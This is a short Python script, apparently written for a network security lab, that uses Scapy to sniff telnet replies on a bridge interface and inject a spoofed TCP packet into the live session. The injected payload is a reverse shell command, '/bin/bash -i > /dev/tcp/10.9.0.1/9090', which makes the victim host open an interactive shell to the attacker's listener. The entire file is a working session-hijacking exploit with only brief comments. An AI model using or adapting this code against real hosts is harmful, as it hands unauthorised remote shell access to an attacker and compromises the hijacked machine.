#!/usr/bin/env python3

from scapy.all import *

def spoof_tcp(pkt): #defining function for spoofing
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src) #get packet destination and source IP
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=pkt[TCP].ack+5, ack=pkt[TCP].seq+len(pkt[TCP].payload)) #get packet source and destination ports, reply with acknowledge flag, get next sequence number, and acknowledgement number
	data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r" #reverse shell command
	pkt = ip/tcp/data #full packet
	#ls(pkt) #list contents of packet
	send(pkt, iface="br-0273bd7e76fb", verbose=0) #send packet

pkt=sniff(iface='br-0273bd7e76fb', filter='tcp and src host 10.9.0.5 and src port 23', prn=spoof_tcp)
#sniff for packet on listed interface, using listed filter, then perform listed function